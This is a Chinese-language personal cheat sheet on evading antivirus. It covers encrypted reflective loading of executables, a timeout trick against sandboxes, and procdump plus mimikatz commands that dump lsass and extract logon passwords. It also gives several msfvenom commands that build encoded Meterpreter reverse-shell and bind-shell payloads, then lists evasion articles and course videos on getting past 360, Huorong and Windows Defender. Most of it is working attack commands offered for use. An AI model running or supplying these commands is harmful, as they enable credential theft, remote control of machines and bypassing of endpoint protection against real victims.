普通 exe 免杀使用 py 或 go 等加密后反射加载，基本上就可以过大部分杀软了。
启动后 cmd /c timeout 延迟等待N秒用来反沙箱

procdump+mimikatz,  mimikatz很多时候都会被杀掉，可以通过procdump+mimikatz的方式 进行绕过。 或 任务管理器—进程—显示所有用户进程—找到lsass(Local Security Authority Process)—右键“创建转储文件”
- mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit">pass.txt

msf

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.161 LPORT=1234 -e x64/shikata_ga_nai -i 5 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -e x86/shikata_ga_nai -i 15  -f c -o payload_bind.txt
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -e x86/shikata_ga_nai -i 15  -f csharp -o payload_bind.txt
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -f c > payload.c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.127.134 LPORT=1234 -f c > payload.c
```

cobalt strike
生成 payload C 版本。用掩日生成一下。

# Article

- rw\_bypass\_免杀\_BypassAV.html
- [不会写代码，但你可以免杀三件套](https://mp.weixin.qq.com/s/NqH7kKS7XQmxaVUDacocZA)
- [有手就行的白加黑实战免杀 - FreeBuf 网络安全行业门户](https://www.freebuf.com/articles/system/333690.htm)
- [一文读懂 DLL 劫持与白+黑样本原理](https://mp.weixin.qq.com/s/UZjLNPna7R2ZLs3r9kJEQg)
- [写外挂时偶然想到的免杀思路](https://mp.weixin.qq.com/s/0c6D2aw9xk-NPKYuCkvoIg)
- [Rust免杀 - Shellcode加载与混淆](https://mp.weixin.qq.com/s/5SP0FerVIsEk3P-eH3PmKw)
- [常用工具免杀-助你护网](https://mp.weixin.qq.com/s/HBLpmCAoPRzvWq5akmLBTw)
- [『杂项』利用 Windows 白名单免杀](https://mp.weixin.qq.com/s/oZLhkFDKOxFUqePqT6HoRA)
7-项目七 渗透有防护的内网域_18 msf 正向木马免杀过360 全家桶【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇01mimikatz免杀过360安全卫士和360安全杀毒【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇02PrintSpoofer免杀过360杀毒360安全卫士【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇03MSF用加载器免杀过360安全卫士和360安全杀毒【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇04Python3Cobaltstrikeshellcode免杀过360卫士和360杀毒【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇05Golang加载器Cobaltstrikeshellcode免杀国内主流杀软【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇06GolangCobaltstrikeshellcode免杀国内主流杀软【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇07c#xor加载器免杀过360安全卫士和360安全杀毒【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇08Cobaltstrike免杀过360和WindowsDefender【瑞客论坛 www.ruike1.com】.mp4
26-红队攻击指南工具免杀篇09msf加密壳免杀过360安全卫士和360安全杀毒【瑞客论坛 www.ruike1.com】.mp4
Cobalt Strike 第十五章 使用多种方法免杀 payload【瑞客论坛 www.ruike1.com】.docx
暗月实战项目八19metasploit免杀杀毒软件并且开启远程终端登录目标服务器【瑞客论坛 www.ruike1.com】.mp4
暗月实战项目十一05frp反向代理msf到公网msf免杀过火绒上线【瑞客论坛 www.ruike1.com】.mp4